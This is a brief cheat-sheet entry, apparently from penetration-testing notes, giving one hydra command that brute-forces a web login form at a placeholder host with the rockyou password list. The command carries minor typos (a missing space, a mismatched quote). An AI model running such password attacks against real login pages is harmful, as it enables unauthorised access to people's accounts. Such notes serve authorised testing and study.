## Hydra
#### login forms
```bash
hydra -l username-P ~/shares/lists/Passwords/rockyou.txt host.ip http-post-form "/login.php:username=^USER^&password=^PASS^&sub=Login:Invalid username or password.”
```
